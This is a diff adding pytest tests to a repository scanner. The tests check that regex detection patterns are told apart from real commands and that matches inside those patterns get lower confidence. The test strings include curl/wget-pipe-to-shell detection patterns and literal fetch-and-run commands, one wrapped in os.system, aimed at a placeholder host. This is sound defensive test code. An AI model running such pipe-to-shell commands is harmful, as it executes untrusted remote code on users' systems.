@@ -3,8 +3,9 @@ import pytest
 from helpers import run_check, view_of
 from repovet.engine.checks import BUILDERS
 from repovet.engine.checks.base import BuildEnv, CheckError, Params
+from repovet.engine.checks.regex import looks_like_regex_literal
 from repovet.limits import Limits
-from repovet.models import CoverageStatus
+from repovet.models import Confidence, CoverageStatus
 
 
 def test_line_scope_reports_line_and_column() -> None:
@@ -69,3 +70,29 @@ def test_long_lines_option() -> None:
     text_spec = {**spec, "scope": "text"}
     assert run_check(text_spec, "a.js", line) == []
     assert len(run_check({**text_spec, "long_lines": True}, "a.js", line)) == 1
+
+
+@pytest.mark.parametrize(
+    ("line", "expected"),
+    [
+        (r'    (r"curl\s+[^|]*\|\s*(?:sudo\s+)?python", 0.9),', True),
+        (r"const re = /wget\s+[^|]*\|\s*(?:node|python)/;", True),
+        ("x = 'curl https://example.invalid | sh' + y", False),  # no regex syntax
+        (r"curl -s https://example.invalid/i.sh | grep -v '^\s*#' | sh", False),
+        ('os.system("curl -s https://example.invalid/i.sh | sh")', False),
+        (r'say "a" then curl\s+x | sh', False),  # the quote before is closed
+    ],
+)
+def test_looks_like_regex_literal(line: str, expected: bool) -> None:
+    start = line.index("curl") if "curl" in line else line.index("wget")
+    assert looks_like_regex_literal(line, start, len(line)) is expected
+
+
+def test_demote_regex_literals_lowers_confidence_per_match() -> None:
+    spec = {"type": "regex", "pattern": r"curl[^\n]*\|[ \t]*sh\b", "demote_regex_literals": True}
+    text = 'P = r"curl\\s+[^|]*\\| sh"\nos.system("curl https://example.invalid | sh")\n'
+    first, second = run_check(spec, "a.py", text)
+    assert first.confidence == Confidence.LOW
+    assert second.confidence is None
+    plain = {"type": "regex", "pattern": r"curl[^\n]*\|[ \t]*sh\b"}
+    assert all(m.confidence is None for m in run_check(plain, "a.py", text))
